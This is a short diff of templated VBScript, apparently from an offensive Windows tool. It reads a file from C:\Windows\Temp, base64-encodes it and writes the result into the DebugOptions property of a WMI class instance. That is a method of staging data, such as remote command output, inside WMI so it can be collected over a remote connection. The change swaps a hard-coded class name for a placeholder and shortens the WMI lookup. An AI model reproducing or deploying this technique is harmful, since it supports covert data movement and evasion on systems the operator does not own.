@@ -13,12 +13,11 @@ If FileExists("C:\Windows\Temp\REPLEACE_WITH_FILENAME") Then
     Base64Encode = oNode.text
     
     On Error Resume Next
-    Set objNewInst = GetObject("Winmgmts:root\Cimv2:Win32_OSRecoveryConfigurationDataBackup.CreationClassName=""RELEACE_WITH_UUID""")
+    Set objTestNewInst = GetObject("Winmgmts:root\Cimv2:REPLEACE_WITH_CLASSNAME.CreationClassName=""RELEACE_WITH_UUID""")
     If Err.Number <> 0 Then
         Err.Clear
         wbemCimtypeString = 8
-        Set objSWbemService = GetObject("Winmgmts:root\cimv2")
-        Set objClass = objSWbemService.Get("REPLEACE_WITH_CLASSNAME")
+        Set objClass = GetObject("Winmgmts:root\cimv2:REPLEACE_WITH_CLASSNAME")
         Set objInstance = objClass.spawninstance_
         objInstance.CreationClassName = "RELEACE_WITH_UUID"
         objInstance.DebugOptions = Base64Encode
